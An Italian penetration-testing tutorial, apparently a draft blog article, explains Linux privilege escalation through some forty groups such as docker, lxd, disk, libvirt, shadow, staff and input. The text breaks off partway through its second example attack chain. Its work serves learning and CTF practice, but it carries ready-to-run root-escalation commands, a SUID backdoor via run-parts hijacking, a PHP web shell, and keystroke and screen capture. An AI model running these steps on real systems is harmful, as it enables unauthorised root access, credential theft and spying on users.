---
title: 'Gruppi Linux per Privilege Escalation: Docker, LXD e disk'
slug: group-linux-privilege-escalation
description: 'Linux privilege escalation tramite 40+ gruppi Linux: disk, Docker, LXD, Incus, MicroK8s, libvirt, shadow, video, adm, input, ssl-cert, KVM, sudo/wheel, lpadmin.'
image: /gruppi-linux-privilege-escalation.webp
draft: true
date: 2026-07-25T00:00:00.000Z
categories:
  - linux
subcategories:
  - privilege-escalation
tags:
  - linux privilege escalation
  - gruppi linux
  - docker privilege escalation
  - lxd incus
  - libvirt
---

# Privilege Escalation tramite Gruppi Linux: Enumerazione e Abuso

I **gruppi Linux** sono uno dei vettori di **privilege escalation** più sottovalutati in fase di enumerazione. Quando si enumera una macchina Linux compromessa, l'attenzione va quasi sempre su due cose: binari SUID e regole `sudo -l`. Sono il primo passo giusto, ma non l'unico. Il comando `id` restituisce anche l'elenco dei gruppi secondari — e alcuni di quei gruppi sono, in certe condizioni, root travestito da permesso "innocuo".

Il punto chiave, prima di tutto il resto: **il privilegio reale non deriva dal nome del gruppo**, deriva dalla combinazione di GID attivi nel processo, proprietà dell'oggetto (file, device, socket), bit di permesso, eventuali ACL, e da chi consuma quell'oggetto dall'altra parte (un demone root, uno script cron, niente). Linux valuta i GID supplementari del **processo** in quel momento, non la semplice presenza del tuo nome in `/etc/group` — motivo per cui verificare, non assumere, è il filo conduttore di questa guida.

## Glossario minimo (se parti da zero)

Se alcuni di questi termini sono già familiari, salta pure avanti. Se no, tienili sott'occhio: torneranno spesso.

* **daemon**: un programma che gira in background, sempre acceso, senza che nessuno lo controlli a mano (es. il servizio Docker).
* **socket** (Unix socket): un canale di comunicazione locale tra programmi sulla stessa macchina, rappresentato come un file speciale sul disco.
* **UID / GID**: il numero identificativo di un utente (UID) o di un gruppo (GID) — i nomi che vedi (`root`, `video`...) sono solo etichette leggibili per quei numeri.
* **namespace**: una "bolla" isolata che il kernel crea per un processo (es. un container), così vede solo una parte del sistema invece di tutto.
* **chroot**: cambiare la cartella che un programma considera "radice" del filesystem — usato per entrare in un altro filesystem come se fosse quello attuale.
* **ACL** (Access Control List): permessi più granulari dei classici `rwx`, assegnabili a utenti/gruppi specifici oltre al proprietario del file.
* **filesystem** (ext4, XFS, Btrfs, ZFS...): il formato con cui i dati sono organizzati su un disco — strumenti come `debugfs` capiscono solo alcuni formati, non tutti.
* **LVM / LUKS**: LVM gestisce dischi/partizioni in modo flessibile; LUKS è cifratura del disco — se c'è, i dati grezzi non si leggono senza la chiave di decifrazione.
* **rootless / rootful**: se un programma (es. Docker) gira come utente normale (rootless) o come root (rootful) — cambia moltissimo l'impatto pratico di un vettore.
* **SELinux / AppArmor**: regole di sicurezza aggiuntive oltre ai permessi classici — possono bloccare un'azione anche se i permessi la consentirebbero.
* **polkit**: il sistema che decide se un utente normale può eseguire azioni amministrative senza essere root.
* **D-Bus**: un sistema di comunicazione tra programmi, usato da molti servizi di sistema Linux.
* **PAM**: il sistema che gestisce login e autenticazione su Linux.
* **capability**: un permesso specifico che normalmente ha solo root (es. leggere pacchetti di rete raw), assegnabile a un singolo programma senza dargli root intero.
* **SUID**: un permesso su un eseguibile che lo fa girare con i permessi del proprietario del file (spesso root), non di chi lo lancia.
* **forward secrecy**: proprietà di TLS moderno per cui, anche rubando la chiave del server in futuro, non si riescono a decifrare conversazioni già avvenute in passato.
* **mTLS**: TLS in cui anche il client, non solo il server, presenta un certificato per autenticarsi.
* **cron**: il sistema che esegue comandi automaticamente a orari programmati.
* **CVE**: un identificativo pubblico assegnato a una vulnerabilità nota e documentata.
* **MOTD**: il messaggio mostrato al login (Message Of The Day).
* **RBAC / Pod Security / hostPath** (mondo Kubernetes): RBAC decide chi può fare cosa nel cluster; Pod Security limita cosa può fare un container; `hostPath` fa vedere a un container una cartella reale della macchina host.

## Enumerazione: capire se un gruppo è davvero sfruttabile

```bash
id
grep '^Groups:' /proc/self/status
getent group NOME_GRUPPO
```

`id` mostra UID, GID primario e gruppi secondari. `getent group` interroga anche fonti NSS esterne (LDAP/SSSD — sistemi che centralizzano utenti/gruppi su un server esterno invece che nel semplice file locale), che un semplice `cat /etc/group` non vede.

Il loop che cerca file/directory posseduti dai tuoi gruppi va esteso: **file e directory da soli escludono proprio gli oggetti più importanti per questo argomento — socket e device**:

```bash
for g in $(id -Gn); do
  find / \( -type f -o -type d -o -type b -o -type c -o -type s \) -group "$g" \
    \( -perm -040 -o -perm -020 -o -perm -010 \) ! -perm -004 -ls 2>/dev/null
done
```

Aggiungendo `-type b` (block device, tipo `/dev/sda` — un intero disco visto come file), `-type c` (character device, tipo `/dev/fb0` o `/dev/input/event*` — dispositivi letti/scritti un dato alla volta) e `-type s` (socket) copri anche `docker.sock`, i socket LXD/libvirt, `/dev/sda`, `/dev/input/event*`, `/dev/fb0` — che con `-type f -o -type d` soltanto non compaiono mai.

Utile anche cercarli esplicitamente per nome, e capire dove finisce un path (traversabilità inclusa):

```bash
find /run /var/run -type s -ls 2>/dev/null
find /dev \( -type b -o -type c \) -ls 2>/dev/null
stat -Lc '%A %a %U:%G %n' OGGETTO
getfacl -p OGGETTO 2>/dev/null
namei -l OGGETTO
findmnt -o TARGET,SOURCE,FSTYPE,OPTIONS
```

`getfacl` conta perché un'ACL può concedere (o negare) accesso indipendentemente dai bit classici `rwx` di gruppo. `findmnt`/`namei` servono a capire cosa stai vedendo davvero: un mount namespace diverso può far apparire un device senza che rappresenti il filesystem host che ti aspetti.

Prima di lanciare un exploit, verifica che il demone/servizio sia davvero attivo e raggiungibile — l'assenza di uno di questi non è sempre un vicolo cieco definitivo, ma va sempre controllata:

```bash
systemctl status docker lxd virtqemud libvirtd 2>/dev/null
ls -l /run/*.sock /var/run/*.sock "$XDG_RUNTIME_DIR"/*.sock 2>/dev/null
getcap $(which dumpcap tcpdump 2>/dev/null) 2>/dev/null
getenforce 2>/dev/null
aa-status 2>/dev/null
```

Nota: libvirt moderno usa spesso demoni modulari (`virtqemud` invece di un unico `libvirtd`); controlla entrambi. SELinux/AppArmor possono bloccare una tecnica specifica, ma non annullano necessariamente l'autorità concessa da un'API — vanno letti come un ostacolo puntuale, non come un interruttore generico sì/no.

## Ordine di priorità

Non tutti i gruppi meritano lo stesso tempo — ma l'ordine dipende dalla primitiva verificata, non dal nome:

1. **`sudo`/`wheel`** — è un'autorizzazione esplicita, non un side-channel: un `sudo -l` costa un secondo e va sempre fatto per primo.
2. **Accesso RW verificato a un daemon rootful locale** (`docker`, `lxd`/`incus-admin`, `libvirt` con `qemu:///system` raggiungibile).
3. **Accesso raw al block device che contiene davvero il filesystem host** (`disk`, dopo aver confermato con `findmnt`/`lsblk` quale device è).
4. **Credenziali leggibili** (`shadow`, `ssl-cert`).
5. **Dispositivi di sorveglianza locale** (`video`, `input`, `audio`) — richiedono attività locale nel momento giusto, non è garantito.
6. **Gruppi situazionali/minori** — richiedono di leggere molto e sperare di trovare qualcosa.

## Flowchart decisionale

```
id / getent group
 │
 ├─ sudo o wheel? ──sì──> sudo -l ──> binario abusabile? ──> root
 │
 ├─ docker.sock raggiungibile e daemon rootful? ──sì──> mount host nel container ──> root
 │
 ├─ lxd/incus-admin raggiungibile? ──sì──> container privilegiato + mount host ──> root
 │
 ├─ libvirt, qemu:///system risponde? ──sì──> virt-rescue sul device host reale ──> root
 │
 ├─ disk, e /dev/sdX confermato con findmnt? ──sì──> debugfs (solo ext2/3/4) ──> root
 │
 ├─ shadow leggibile e hash non locked (non !/*)? ──sì──> cracking ──> hash di root rotto? ──> root
 │
 ├─ video/input, con attività locale in corso? ──sì──> cattura ──> qualcosa di utile? ──> nuovo utente, richiama id
 │
 └─ nessuno dei precedenti ──> gruppi minori, o cambia vettore (SUID, kernel)
```

## Tabella riassuntiva

GID di riferimento per Debian/Ubuntu — su RHEL/Fedora/Arch alcuni numeri cambiano, verifica sempre con `getent group NOME`. Dove il gruppo nasce quando installi il pacchetto (docker, libvirt, kvm...) il GID è assegnato dinamicamente: non esiste "il numero giusto" a priori.

| Gruppo                  | GID (Debian/Ubuntu) | Accesso concesso                                      | Root diretto?                    | Condizione necessaria                                                                     |
| ----------------------- | ------------------- | ----------------------------------------------------- | -------------------------------- | ----------------------------------------------------------------------------------------- |
| `sudo` / `wheel`        | 27                  | Esecuzione comandi come root via sudo                 | Dipende da `sudoers`             | Verificare con `sudo -l`, non assumere                                                    |
| `disk`                  | 6                   | Lettura/scrittura raw sui device a blocchi            | Sì, se il device è quello giusto | Confermare con `findmnt`/`lsblk`, filesystem ext2/3/4 per `debugfs`                       |
| `docker`                | dinamico            | Creazione container con mount arbitrari dell'host     | Sì                               | Daemon rootful locale raggiungibile (non rootless, non context remoto)                    |
| `lxd` (o `incus-admin`) | dinamico            | Creazione container/istanze privilegiate              | Sì                               | Daemon raggiungibile; su Incus serve `incus-admin`, non solo `incus`                      |
| `libvirt`               | dinamico            | Gestione VM QEMU/KVM tramite demone root              | Sì, con più passaggi             | `qemu:///system` raggiungibile, non `qemu:///session`                                     |
| `kvm`                   | dinamico            | Accesso hardware a `/dev/kvm` per QEMU diretto        | No, da solo                      | Vettore indipendente; diventa critico solo insieme a `libvirt` o daemon container rootful |
| `shadow`                | 42                  | Lettura diretta di `/etc/shadow`                      | No, serve cracking               | Hash non locked (`!`/`*`), non solo auth esterna (LDAP/SSSD)                              |
| `video`                 | 44                  | Lettura del framebuffer, se esposto                   | No, serve un secondo step        | `/dev/fb0` presente (assente ≠ headless su desktop DRM/KMS)                               |
| `adm`                   | 4                   | Lettura di log in `/var/log/` (path varia per distro) | No                               | Richiede un errore/misconfigurazione altrui nei log                                       |
| `input`                 | dinamico            | Lettura raw dei device di input                       | No, serve un secondo step        | ACL logind sul device, non "Wayland sì/no"                                                |
| `ssl-cert`              | dinamico            | Lettura chiavi private TLS                            | No, è un info-leak               | Impersonazione/mTLS, NON decifra TLS con forward secrecy                                  |

Oltre a questi ce ne sono altri 15+ minori o situazionali (elenco più avanti) e una decina a basso segnale di default.

## disk (GID 6) — accesso raw ai device, se è davvero quello giusto

Chi appartiene al gruppo `disk` può leggere/scrivere direttamente i device a blocchi, bypassando i permessi del filesystem che ci gira sopra. Prima di tutto, però, verifica QUALE device contiene davvero la root dell'host — non darlo per scontato:

```bash
findmnt /
lsblk -f
```

Root può stare su un partizionamento semplice (`/dev/sda1`), ma anche su LVM, device mapper (un livello software tra il disco fisico e ciò che il sistema vede come "disco"), mdraid (dischi multipli uniti in RAID via software), un disco NVMe (un tipo di SSD veloce, con nome device diverso da `/dev/sda`) o dietro LUKS: se è cifrato e non hai il mapping decifrato a disposizione, l'accesso raw al device non ti dà comunque il contenuto in chiaro.

`debugfs` funziona solo su **ext2/3/4** — non su XFS, Btrfs o ZFS:

```bash
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat root.txt
```

Cosa cambia concretamente tra sola lettura e scrittura:

| Modalità                          | Cosa puoi fare davvero                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| --------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Lettura** (default, senza `-w`) | Leggi QUALSIASI file, ignorando i permessi normali. Esempi concreti: `debugfs: cat /root/.ssh/id_rsa` ti dà la chiave privata SSH di root — con quella fai `ssh root@target` da un'altra sessione, senza sapere nessuna password. `debugfs: cat /etc/shadow` ti dà gli hash di tutti gli utenti da craccare offline. Ovviamente anche `cat root.txt` o qualsiasi altro file "flag".                                                                                                                                    |
| **Scrittura** (`debugfs -w`)      | Permette di creare o modificare file, ma con un limite spesso ignorato: scrivere SOPRA un file già di proprietà di root (`/etc/passwd`, `/etc/shadow`) frequentemente dà comunque "Permesso negato", anche così. Funziona meglio per creare file nuovi o modificare file non di root. Se ti serve proprio riscrivere `/etc/passwd`, spesso è più affidabile copiare fuori l'intero filesystem/device e modificarlo offline, poi riscriverlo — non aspettarti che la scrittura diretta funzioni sempre come la lettura. |

`debugfs -w` è comunque potenzialmente distruttivo se il filesystem è montato e attivo: usalo con cautela, non come primo tentativo.

## shadow (GID 42) — hash delle password, se sono davvero crackabili

Il gruppo `shadow` dà accesso in lettura a `/etc/shadow`. Prima di lanciare un cracker, guarda cosa c'è davvero nel campo hash:

* `!` o `*` al posto dell'hash: l'account è bloccato, non ha una password usabile per il login diretto.
* Un hash (la versione "cifrata" della password, quella che vedi al posto della password vera) presente non garantisce nulla: dipende dall'algoritmo con cui è stato generato (yescrypt è molto più lento da indovinare a forza bruta di un vecchio md5crypt) e da quanto è debole la password reale.
* Se l'autenticazione passa da LDAP/SSSD, il file locale può essere irrilevante.

```bash
cat /etc/shadow > shadow.txt
cat /etc/passwd > passwd.txt
unshadow passwd.txt shadow.txt > combined.txt
john --wordlist=/usr/share/wordlists/rockyou.txt combined.txt
```

[`john`](https://hackita.it/articoli/john-the-ripper/) prova a indovinare la password provando milioni di parole da una lista già pronta (la "wordlist", qui `rockyou.txt` — una raccolta di password reali trapelate in passato) finché una non produce lo stesso hash. Se l'hash di root si rompe, hai la password in chiaro: puoi fare `su root` o `ssh root@target`. Se si rompe solo quello di un utente normale, hai comunque un salto laterale utile — magari quell'utente è in un gruppo più interessante di quello con cui sei entrato, o ha permessi `sudo`.

Il cracking è offline rispetto al target, ma l'accesso e l'esfiltrazione del file possono comunque lasciare tracce (accesso a un file normalmente riservato a root/PAM).

## docker (GID dinamico) — mount dell'host, se il daemon è quello che pensi

Il gruppo `docker` parla con il Docker daemon, e quel daemon gira come **root**: è per questo che l'appartenenza è considerata root-equivalent by design, non un bug.

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

Prima di lanciarlo, tre verifiche che cambiano l'esito:

* **Context remoto**: `docker context show` — se il context punta a un host remoto (`$DOCKER_HOST` o context configurato), quello che controlli è il demone remoto, non il target locale.
* **Rootless vs `userns-remap`**: sono cose diverse. Rootless Docker fa girare daemon e container senza root — qui il vettore non si applica allo stesso modo. `userns-remap` invece lascia il daemon come root, cambia solo la mappatura UID dentro i container: il vettore socket resta valido.
* **`docker ps: permission denied`** non significa sempre "gruppo non attivo": può essere context sbagliato, un'ACL sul socket, un authorization plugin (un modulo extra che Docker può usare per decidere chi può fare cosa, oltre al semplice gruppo), o un daemon remoto. Riloggarsi/`newgrp docker` risolve solo il caso in cui il GID non è ancora stato acquisito dalla shell corrente.

Per approfondire l'enumerazione di ambienti Docker prima di arrivare a questo punto, vedi [Container Escape](https://hackita.it/articoli/container-escape/).

## lxd / Incus (GID dinamico) — stesso principio, verifica quale demone e quale gruppo

`lxd` è il gruppo che conta davvero — dà accesso al socket del demone LXD. `lxc` è principalmente il nome del comando client: non darlo per scontato come gruppo equivalente, verifica separatamente con `getent group lxd` e `getent group lxc`.

```bash
lxc image import alpine.tar.xz rootfs.squashfs --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
```

Precisazione tecnica (approfondita anche in questa [analisi di Steflan's Security Blog sui gruppi Linux](https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/)): `security.privileged=true` disattiva la rimappatura UID/GID dello user namespace — è quello a dare accesso ai file host con i permessi reali. Non "rimuove tutte le restrizioni": AppArmor, seccomp (un filtro che limita quali funzioni del kernel un programma può chiamare) e gli altri namespace restano attivi salvo configurazione esplicita diversa.

Se manca uno storage pool (lo spazio disco che LXD usa per creare i container — se non è mai stato configurato, `lxc list` dà errore), non è detto sia un vicolo cieco: con accesso pieno al demone puoi normalmente configurarlo tu stesso (`lxd init`) — è un passaggio in più, non una prova che il vettore sia inutilizzabile.

### Incus (il successore di LXD)

Su sistemi che usano Incus, la distinzione tra gruppi è netta: **`incus-admin`** dà accesso completo e root-equivalent al demone; il solo gruppo **`incus`** confina l'utente in un progetto isolato per-utente, senza privilegi amministrativi. "Sono nel gruppo container" non equivale automaticamente a root su Incus: verifica sempre quale dei due hai.

## libvirt (GID dinamico) — il demone apre i file per te, non tu direttamente

Il gruppo `libvirt` dà accesso al socket di `libvirtd`/`virtqemud`. Connesso con l'URI (l'indirizzo a cui il client si collega — un po' come un URL, ma per parlare col demone locale) `qemu:///system`, quel demone gira come **root**; con `qemu:///session` invece gira nel TUO contesto utente — senza alcun privilegio in più. Verifica sempre quale URI risponde:

```bash
virsh -c qemu:///system list --all
```

Non esiste un comando che "attacca `/` come disco" — `/` è una directory, non un'immagine disco né un block device, e nessun tool QEMU/libvirt la accetta come sorgente. La tecnica reale sfrutta il fatto che è **libvirtd, non tu**, ad aprire il device per conto tuo. Identifica prima il device reale (stessi comandi della sezione `disk`):

```bash
findmnt /
lsblk -f
```

Poi collegalo tramite `virt-rescue` (parte di libguestfs, spesso presente insieme a libvirt), forzando il backend a passare per il demone:

```bash
LIBGUESTFS_BACKEND=libvirt virt-rescue -a /dev/sda1
><rescue> mount /dev/sda1 /sysroot
><rescue> cat /sysroot/root/root.txt
```

Quella variabile d'ambiente è il dettaglio che sfrutta DAVVERO il gruppo `libvirt` (e non il gruppo `disk`, che è un vettore diverso: lì il device lo apri tu, qui lo apre il demone root per te). Se `virt-rescue` non è disponibile, lo stesso risultato si ottiene creando un dominio con `virt-install`, collegando il device reale come disco secondario e avviando un'immagine di soccorso da cui montarlo.

### kvm (vettore indipendente da libvirt)

Il gruppo `kvm` da solo dà accesso a `/dev/kvm` — accelerazione hardware per la virtualizzazione, utilizzabile anche senza `libvirt` (es. QEMU lanciato direttamente). Non concede accesso al filesystem host di per sé: è un vettore separato, non un prerequisito di `libvirt` né una sua conseguenza automatica.

## video (GID 44) — vedere lo schermo, non necessariamente le password digitate

Il gruppo `video` dà accesso al framebuffer legacy (`/dev/fb0`), se il sistema lo espone ancora. Molti desktop moderni usano DRM/KMS (`/dev/dri/*`) senza passare da `/dev/fb0`: la sua **assenza non dimostra che la macchina sia headless**, solo che quella specifica interfaccia non è esposta.

```bash
cat /dev/fb0 > screen.raw
cat /sys/class/graphics/fb0/virtual_size
ffmpeg -f rawvideo -pixel_format bgr0 -video_size 1176x885 -i screen.raw -update 1 out.png
```

Punto tecnico da non confondere: una password digitata a un prompt normale (`login:`, `su`, `sudo`) **non compare mai a schermo**, perché il terminale disattiva l'eco dei caratteri per quell'input. Uno screenshot in quel momento non mostra la password che qualcuno sta scrivendo. Quello che può finire visibile è altro: output già stampato (un `cat` su un file con dentro una credenziale, un comando con la password come argomento visibile nella shell, un editor con un config aperto). È **screen capture, non keylogging**: cattura ciò che è renderizzato, non ciò che viene digitato in un campo mascherato. Questa tecnica compare in diverse box di HackTheBox, dove lo screenshot rivela contenuti già a video, non l'atto di digitare una password.

## adm (GID 4) — credenziali nei log, quando qualcuno sbaglia

Il gruppo `adm` dà lettura ai log — su Debian/Ubuntu tipicamente `/var/log/auth.log`, su RHEL/Fedora il path standard è `/var/log/secure`. Cron e sudo **non loggano password per design**: se una credenziale compare in chiaro in un log, è quasi sempre una misconfigurazione o un errore applicativo, non un comportamento da aspettarsi ovunque.

```bash
grep -i "password" /var/log/auth.log* /var/log/secure* 2>/dev/null
grep -i "fail" /var/log/auth.log* /var/log/secure* 2>/dev/null
```

È il gruppo più "lento" — richiede di leggere molto sperando in un errore altrui — ma proprio per questo spesso trascurato.

## input (GID dinamico) — keylogging, se l'ACL lo permette davvero

Il gruppo `input` dà accesso raw a `/dev/input/event*`. In lettura, intercetti tutto ciò che un altro utente digita o clicca in tempo reale — esempio concreto: se root apre un terminale e digita `mysql -u root -pLaPasswordVera`, quel comando passa anche per gli eventi di tastiera che stai leggendo. Se il device risulta anche scrivibile, in teoria puoi iniettare eventi finti (premere tasti "virtuali" come se li stessi digitando tu sulla tastiera del target) — tecnica più avanzata e meno comune del semplice leggere.

```bash
evtest
cat /dev/input/event4
```

Il vero cancello non è "c'è Wayland quindi bloccato": `logind` assegna dinamicamente l'accesso ai device di sessione tramite ACL (tipicamente al solo compositor attivo — il programma che disegna e gestisce le finestre sullo schermo), indipendentemente dal display server. Verifica sempre con `getfacl /dev/input/eventN` invece di dedurlo dal tipo di sessione. Nota anche che questo intercetta l'input **sul target**, non ciò che digiti tu localmente durante una sessione SSH — e gli `eventX` cambiano a ogni hotplug/reboot.

## ssl-cert (GID dinamico) — chiavi TLS: info-leak specifico, non decifra tutto

Su Debian/Ubuntu, `ssl-cert` dà lettura sulle chiavi private in `/etc/ssl/private/`.

```bash
ls -la /etc/ssl/private/
cat /etc/ssl/private/nome-servizio.key
```

Con la chiave puoi impersonare quel servizio (un attacco MITM, "man in the middle": ti metti in mezzo tra due che comunicano, spacciandoti per uno dei due con un certificato "valido") o autenticarti se è una chiave client mTLS. **Non puoi** invece decifrare genericamente traffico TLS già catturato: dalla TLS 1.3 in poi — e già con la cipher suite (la combinazione di algoritmi di cifratura usata) ECDHE su TLS 1.2 — la forward secrecy lo impedisce, perché la chiave privata serve solo per l'handshake, non per derivare la chiave di sessione. Funziona solo su handshake legacy a scambio di chiave RSA statico, ormai rari.

## root (GID 0) come gruppo secondario

Un utente può trovarsi come membro secondario del gruppo `root` (GID 0) — diverso dall'essere l'utente root. In quel caso, ogni file posseduto da GRUPPO root con permesso di scrittura per il gruppo diventa modificabile:

```bash
find / -group root -perm -g=w 2>/dev/null
```

Se compaiono config di servizi eseguiti da root o librerie caricate da processi root, hai un punto d'appoggio — dipende cosa trovi, non è automatico. Esempio concreto: se trovi scrivibile il file `.service` di systemd di un demone che gira come root, ci aggiungi un comando tuo (`ExecStartPre=/bin/bash -c "chmod +s /bin/bash"`) e aspetti il prossimo riavvio/restart del servizio.

## staff (GID 50) — dirottare `/usr/local` e i cron di sistema

Su Debian/Ubuntu, `staff` ha scrittura su `/usr/local` (definizione ufficiale sul [wiki dei System Groups di Debian](https://wiki.debian.org/SystemGroups)), e su queste distribuzioni `/usr/local/bin` precede `/usr/bin` nel `$PATH` (la lista di cartelle in cui il sistema cerca un comando quando lo lanci per nome, in ordine). Un bersaglio concreto è `run-parts`, richiamato da [cron](https://hackita.it/articoli/crontab/) e da molte sessioni SSH (script di MOTD dinamico):

```bash
cat /etc/crontab | grep run-parts

echo '#!/bin/bash
chmod 4777 /bin/bash' > /usr/local/bin/run-parts
chmod +x /usr/local/bin/run-parts

# aspetta il prossimo cron schedulato, o una nuova sessione SSH
/bin/bash -p
```

Alla prossima esecuzione, il tuo script gira come root e rende `/bin/bash` SUID.

## Altri gruppi da conoscere

Nessuno di questi va scartato solo per il nome: qualunque gruppo può contare se possiede un oggetto (file, socket, device) consumato da un processo privilegiato. Ecco i più comuni da riconoscere:

* **sudo**/**wheel**: assegnazione esplicita — `sudo -l` sempre, e per ogni binario che risulta permesso controlla GTFOBins (un sito che elenca, per ogni programma comune, se e come può essere usato per ottenere una shell o bypassare restrizioni).
* **libvirt-qemu** / **qemu**: utente/gruppo sotto cui gira il PROCESSO QEMU su alcune distro — diverso da `libvirt` (che amministra il demone). Può esporre immagini disco delle VM e segreti in `/var/lib/libvirt/images/` senza dare controllo amministrativo del demone.
* **systemd-journal**: lettura completa del journal — spesso più utile di `adm`, perché ci finiscono anche variabili d'ambiente, token e output di script lanciati da servizi root che i log classici non catturano. Comandi utili: `journalctl -xe`, `journalctl -u NOME_SERVIZIO`, `journalctl --since today`.
* **containerd** (`ctr`): se il socket `/run/containerd/containerd.sock` è raggiungibile (di norma solo root, ma verifica sempre i permessi reali — non esiste un gruppo "containerd" universale di default), stesso principio di Docker: `ctr image list`, poi `ctr run --mount type=bind,src=/,dst=/,options=rbind -t <immagine> ubuntu bash`.
* **podman**: rootless by default, quindi l'appartenenza a un eventuale gruppo non equivale automaticamente a root come per Docker. Verifica prima `podman info` (cerca `rootless: true/false`): solo se rootful, `podman run --privileged` con mount dell'host si comporta come il vettore Docker.
* **systemd-network** (GID dinamico): su alcune distro i file `.network`/`.netdev` sono leggibili dal gruppo — possono contenere chiavi WireGuard (un protocollo VPN moderno). Dipende dalla configurazione.
* **[wireshark](https://hackita.it/articoli/wireshark/)** / **pcap** (GID dinamico): `dumpcap` sniffa traffico solo se il binario ha ANCHE la capability `cap_net_raw`/`cap_net_admin` — il gruppo da solo non basta, verifica con [`getcap`](https://hackita.it/articoli/getcap/).
* **lp** (GID 7): accesso alle code di stampa — può esporre il CONTENUTO dei documenti in spool. Diverso da `lpadmin`.
* **lpadmin** (GID dinamico): amministrazione [CUPS](https://hackita.it/articoli/porta-631-ipp-cups/). Storicamente (CVE-2012-5519) permetteva di far leggere a `cupsd` (root) file arbitrari via un percorso di log impostato dall'interfaccia web. Patchato da anni: rilevante solo su sistemi molto datati.
* **operator** (GID 37): accesso operativo specifico della piattaforma, spesso porta a disclosure di dati a runtime più che ad accesso diretto.
* **dialout** (GID 20): porte seriali (`/dev/ttyS*`, `/dev/ttyUSB*`) — centrale con target embedded/router/PLC collegati via seriale; l'impatto dipende interamente dal dispositivo agganciato.
* **netdev** (GID dinamico): gestione rete via NetworkManager senza sudo. Interessante non solo per modificare DNS/proxy, ma perché rivela credenziali salvate: `nmcli connection show NOME -p` stampa in chiaro la password WiFi/VPN salvata per quella connessione, se presente.
* **www-data** (GID 33, o l'utente del tuo webserver) come gruppo secondario: se ci sei dentro, i file posseduti da quel gruppo e scrivibili diventano modificabili — utile per alterare cosa serve/esegue il webserver, portandoti al privilegio di www-data (lateral, non root diretto salvo altre catene). Esempio concreto: sovrascrivi un file `.php` che il server esegue, inserendoci una web shell (`<?php system($_GET['cmd']); ?>`), poi lo richiami dal browser per eseguire comandi come www-data. Verifica con `find / -group www-data -writable 2>/dev/null`.
* **messagebus** (GID dinamico): accesso al bus D-Bus di sistema (`/run/dbus/`) — superficie niche ma reale per enumerazione/command injection via D-Bus.
* **polkitd** (GID dinamico): accesso a regole/configurazioni polkit locali — situazionale, raramente un vettore diretto da solo.
* **kubernetes locale** (minikube, kind, rke2...): questi tool in genere NON usano un gruppo Linux dedicato ma un file `kubeconfig` con permessi ristretti — cercalo con `find / -iname "*kubeconfig*" -o -iname "config" 2>/dev/null | grep -i kube`, non assumere un gruppo per nome.
* **utmp** (GID 43): lettura di chi è connesso (`/var/run/utmp`, `/var/log/wtmp`) — su alcuni sistemi questi file sono comunque world-readable; il rischio reale del gruppo può essere la SCRITTURA (manomissione anti-forensics), non solo la lettura.
* **audio** (GID 29): `/dev/snd/*` — in teoria registrazione microfono, ma il device grezzo gestito da ALSA (il driver audio del kernel) non equivale automaticamente al flusso audio della sessione di un altro utente, gestito da un livello sopra (PipeWire o PulseAudio). Raro.
* **render** (GID dinamico) / **plugdev** (GID 46): GPU e device rimovibili — superfici diverse tra loro, raramente privesc diretto, più utili per enumerazione o vecchie vulnerabilità in demoni come `udisks`.
* **fuse** (GID dinamico): montaggi FUSE accessibili ad altri se `user_allow_other` è abilitato — situazionale.
* **backup** (GID 34): script di backup automatizzati — se qualche archivio (dump DB, `/root/.ssh`, backup con `/etc/shadow`) finisce group-readable, è un vettore di lettura dati. Verifica con `find / -group backup 2>/dev/null`.
* **tape** (GID 26): device a nastro fisici (`/dev/st0`), NON backup generici. Su server virtualizzati/cloud il device non esiste: innocuo per costruzione lì.
* **sg** (GID dinamico): accesso SCSI generic (`/dev/sg*`) — legacy, da verificare device per device.
* **tty** (GID 5): scrittura sui terminali di altri utenti — interferenza/phishing locale, non root diretto; le distro moderne lo limitano parecchio.
* **kmem** (GID 15) / **mem**: storico accesso a memoria kernel/fisica — su kernel moderni quasi sempre disabilitato (`CONFIG_STRICT_DEVMEM`).
* **MicroK8s** (gruppo `microk8s`, se presente): i membri eseguono comandi contro il cluster locale — l'impatto dipende da RBAC/Pod Security e dalla possibilità di creare pod con `hostPath`. Argomento abbastanza vasto da meritare un articolo a parte.

## Gruppi a basso segnale di default

Non sono "impossibili", sono statisticamente poco produttivi: `users` (100), `nogroup` (65534), `games` (60), `cdrom` (24), `floppy` (25), `scanner` (dinamico), `mail` (8, può comunque esporre link di reset o OTP nelle code, quindi non ignorarlo del tutto), `fax` (21), `voice` (22), `dip` (30). Trattali come ultima priorità, non come esclusi a priori — se `find / -group NOME` restituisce qualcosa di inaspettato, quello conta più del nome del gruppo.

## Falsi positivi comuni

* `docker` presente ma daemon spento, rootless, o context punta altrove.
* `lxd`/`incus` presente ma storage pool assente — configurabile tu stesso se hai accesso pieno, non un vicolo cieco definitivo.
* `libvirt` presente ma `qemu:///system` non raggiungibile (magari risponde solo `qemu:///session`, senza privilegio).
* `video` presente ma `/dev/fb0` assente — può essere solo DRM/KMS, non necessariamente headless.
* `input` presente ma ACL logind nega l'accesso in quel momento.
* `lpadmin` presente ma CUPS aggiornato oltre la versione patchata (2012).

## Errori comuni

* Fermarsi a SUID/`sudo -l` senza mai guardare `groups`/`id`.
* Assumere l'impatto di un gruppo dal nome invece di verificare device/socket/demone reali.
* Con `docker`/`lxd`, dimenticare `--rm` — che comunque pulisce solo il container, non gli eventi del daemon, i log, le immagini scaricate o le tracce di rete.
* Con `debugfs -w` o scritture dirette su disco, agire senza sapere se il filesystem è live e attivo.
* Con `video`/`input`, aspettarsi risultati garantiti al primo tentativo.

## Esempi sintetici di attack chain

Scenari illustrativi per capire come i gruppi si concatenano — non riferiti a una box specifica.

**Scenario 1 — video → disk**

```
Shell come utente_A
  → id → gruppo "video"
  → cattura /dev/fb0 → nello screenshot c'è un comando con una credenziale già visibile a schermo
  → SSH come utente_B con quella credenziale
  → id → utente_B è nel gruppo "disk"
  → findmnt / conferma /dev/sda1 → debugfs → root.txt
```

**Scenario 2 — adm → sudo**

```
Shell come www-data (ottenuta sfruttando una LFI, Local File Inclusion — una falla che fa leggere/eseguire file del server a un'applicazione web che non dovrebbe)
